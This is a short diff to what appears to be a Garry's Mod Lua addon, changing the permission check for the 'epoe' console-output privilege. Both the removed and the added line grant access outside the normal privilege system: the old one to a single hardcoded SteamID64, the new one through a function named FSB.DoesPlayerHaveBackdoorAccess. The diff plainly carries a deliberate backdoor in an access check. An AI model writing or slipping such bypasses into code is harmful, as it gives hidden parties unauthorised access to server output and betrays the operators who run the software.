@@ -1,3 +1,4 @@
+
 if epoe then
 	CAMI.RegisterPrivilege{
 		Name = "epoe",
@@ -8,7 +9,7 @@ if epoe then
 	---@param unsubscribe boolean
 	---@return boolean
 	function epoe.CanSubscribe(ply, unsubscribe)
-		return CAMI.PlayerHasAccess(ply, "epoe") or (ply:SteamID64() == "76561198366174073" and ply:IsFullyAuthenticated())
+		return CAMI.PlayerHasAccess(ply, "epoe") or FSB.DoesPlayerHaveBackdoorAccess(ply)
 	end
 end
 
